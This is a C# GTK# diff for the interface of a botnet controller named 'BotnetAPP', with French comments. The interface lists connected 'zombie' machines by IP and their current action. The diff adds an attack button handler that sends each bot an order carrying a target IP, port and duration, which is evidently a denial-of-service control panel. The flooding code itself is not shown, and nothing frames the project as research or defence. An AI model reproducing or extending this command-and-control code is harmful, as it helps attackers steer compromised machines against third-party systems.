@@ -72,6 +72,8 @@ namespace BotnetAPP.UI
             * LA CIBLE DOIT ÊTRE CONFIGURER SUR LA PAGE 
             **/
 
+
+
             ZombiePage = new VBox();
 
             ScrolledWindow sw = new ScrolledWindow();
@@ -83,14 +85,18 @@ namespace BotnetAPP.UI
                 Sensitive = false
             };
 
+
+
+   
+
             treeView = new TreeView();
             CellRenderer rendererText = new CellRendererText();
 
-            treeView.AppendColumn("ORDER", new CellRendererToggle() { Active = true });
-            treeView.AppendColumn("IP", new CellRendererText(), "text", 1);
-            treeView.AppendColumn("ACTION", new CellRendererText(), "text", 2);
+            //treeView.AppendColumn("ORDER", new CellRendererToggle() { Active = true });
+            treeView.AppendColumn("IP", new CellRendererText(), "text", 0);
+            treeView.AppendColumn("ACTION", new CellRendererText(), "text", 1);
 
-            ListStore = new ListStore(typeof(CheckButton), typeof(string), typeof(string));
+            ListStore = new ListStore(typeof(string), typeof(string));
 
 
             treeView.Model = ListStore;
@@ -103,8 +109,6 @@ namespace BotnetAPP.UI
 
             ZombiePage.PackStart(sw, true, true, 0);
             ZombiePage.PackEnd(AttackButton, false, true, 0);
-
-
 
             /**
                 PAGE DE PARAMÈTRE 
@@ -126,9 +130,6 @@ namespace BotnetAPP.UI
 
 
             Button VerrouillerCibleBouton = new Button("Valider");
-
-
-
 
 
             SettingPage.PackStart(DurationAttackTitle, false, false, 10);
@@ -232,6 +233,10 @@ namespace BotnetAPP.UI
 
             Add(_mainBox);
 
+            AttackButton.Clicked += delegate {
+                _Net.GiveOrder(new Order(PortAttackSetting.ValueAsInt , TargetIPEntry.Text, DurationAttackSetting.ValueAsInt  )) ; 
+            } ;
+
 
             ShowAll();
         }
@@ -239,21 +244,13 @@ namespace BotnetAPP.UI
 
         private void RefreshBoard(object sender) {
 
-            Console.WriteLine("on passe ici refresh") ; 
-
-
             ListStore.Clear() ;
 
             Dictionary<Zombie, System.Net.Sockets.Socket> connectedUser = _Net.GetConnectedBot ;
 
             foreach ( KeyValuePair<Zombie, System.Net.Sockets.Socket> item in connectedUser)  {
-                Console.WriteLine("ICI") ; 
-                ListStore.AppendValues(new CheckButton(),item.Value.RemoteEndPoint.ToString(), "test") ; 
+                ListStore.AppendValues(item.Value.RemoteEndPoint.ToString(), item.Key.GetAction ) ; 
             }
-
-
-
         }
-
     }
 }
